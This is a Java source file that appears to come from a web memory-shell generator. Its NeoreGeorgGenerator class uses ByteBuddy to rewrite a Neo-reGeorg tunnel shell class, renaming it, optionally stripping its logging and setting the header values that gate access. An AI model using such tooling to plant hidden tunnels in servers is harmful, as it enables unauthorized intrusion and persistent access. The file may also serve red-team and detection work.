package com.reajason.javaweb.memshell.generator;

import com.reajason.javaweb.ClassBytesShrink;
import com.reajason.javaweb.buddy.LdcReAssignVisitorWrapper;
import com.reajason.javaweb.buddy.LogRemoveMethodVisitor;
import com.reajason.javaweb.buddy.ServletRenameVisitorWrapper;
import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.config.NeoreGeorgConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.dynamic.DynamicType;

import java.util.HashMap;

import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * @author ReaJason
 * @since 2025/2/12
 */
public class NeoreGeorgGenerator {
    private final ShellConfig shellConfig;
    private final NeoreGeorgConfig neoreGeorgConfig;

    public NeoreGeorgGenerator(ShellConfig shellConfig, NeoreGeorgConfig neoreGeorgConfig) {
        this.shellConfig = shellConfig;
        this.neoreGeorgConfig = neoreGeorgConfig;
    }

    public DynamicType.Builder<?> getBuilder() {
        DynamicType.Builder<?> builder = new ByteBuddy()
                .redefine(neoreGeorgConfig.getShellClass())
                .name(neoreGeorgConfig.getShellClassName())
                .visit(new TargetJreVersionVisitorWrapper(shellConfig.getTargetJreVersion()));

        if (shellConfig.isJakarta()) {
            builder = builder.visit(ServletRenameVisitorWrapper.INSTANCE);
        }

        if (shellConfig.isDebugOff()) {
            builder = LogRemoveMethodVisitor.extend(builder);
        }

        return builder.field(named("headerName")).value(neoreGeorgConfig.getHeaderName())
                    .field(named("headerValue")).value(neoreGeorgConfig.getHeaderValue());
    }

    public byte[] getBytes() {
        DynamicType.Builder<?> builder = getBuilder();
        try (DynamicType.Unloaded<?> make = builder.make()) {
            return ClassBytesShrink.shrink(make.getBytes(), shellConfig.isShrink());
        }
    }
}
